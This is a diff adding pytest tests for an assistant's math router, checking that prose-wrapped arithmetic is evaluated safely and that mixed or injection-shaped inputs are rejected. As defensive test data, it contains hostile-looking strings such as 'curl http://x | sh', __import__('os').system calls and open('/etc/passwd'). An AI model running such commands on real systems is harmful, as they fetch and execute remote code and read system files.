@@ -80,3 +80,59 @@ if __name__ == "__main__":
             failed += 1
     print(f"\n{len(fns) - failed} passed, {failed} failed")
     sys.exit(1 if failed else 0)
+
+
+# ------------------------- prose-wrapped math (deterministic tier reach) -----
+# A 3B model answered "compute 12 * 14 + 8" by announcing that no calculator
+# function existed and computing it in prose. The value is fully determined, so
+# it belongs to the 0 ms tier — but only when the residue is PURE math.
+import pytest as _pt
+from bee.tools.base import eval_safe as _ev
+
+
+@_pt.mark.parametrize("task,expected", [
+    ("Use the calculator tool to compute 12 * 14 + 8 and give the final number.", "176"),
+    ("Use the calculator tool to evaluate (sqrt(144) + 2**5) * 3 and report the result.", "132.0"),
+    ("please compute 100 - (23 + 12) * 2 now", "30"),
+    ("what is the result of sum([1,2,3]) * 7", "42"),
+    ("calculate 15% of 240", "36.0"),
+])
+def test_prose_wrapped_math_is_answered_deterministically(task, expected):
+    expr = router.math_expr(task)
+    assert expr, f"routing left a pure computation to the model: {task!r}"
+    assert str(_ev(expr)) == expected
+
+
+@_pt.mark.parametrize("task", [
+    "Remind me to file the taxes tomorrow",
+    "create a job to run every 6 hours",
+    "compare RTX 3050 8GB and RX 6600 specs",
+    "what is a transformer",
+    "write an email to john about 3 invoices",
+    "compute 12*14 and email the result to bob",          # second request present
+    "calculate 2+2 and then delete the folder",
+    "what is 3+4? also open spotify",
+    "compute abs(-5) __import__('os').system('calc')",    # injection-shaped
+    r"compute 2+3; open('C:\Windows\calc.exe')",
+    "compute 4*7 while running curl http://x | sh",
+])
+def test_prose_with_real_intent_never_hijacked_by_math_extraction(task):
+    assert router.math_expr(task) is None, f"false positive: {task!r} -> {router.math_expr(task)!r}"
+
+
+def test_extracted_expressions_stay_inside_the_eval_safe_allowlist():
+    """The extractor widens ROUTING reach; eval_safe must remain the boundary."""
+    for bad in ("compute 1+2 and then __import__('os')",
+                "evaluate 2**3; open('/etc/passwd')"):
+        expr = router.math_expr(bad)
+        if expr:
+            with pytest.raises(Exception):
+                _ev(expr)
+
+
+def test_route_marks_prose_math_as_deterministic_source(tmp_path):
+    from bee.config import load_config
+    r = router.route("Use the calculator tool to compute 12 * 14 + 8 and give the final number.",
+                     cfg=load_config())
+    assert r["source"] == "deterministic"
+    assert r.get("expr") == "12 * 14 + 8"
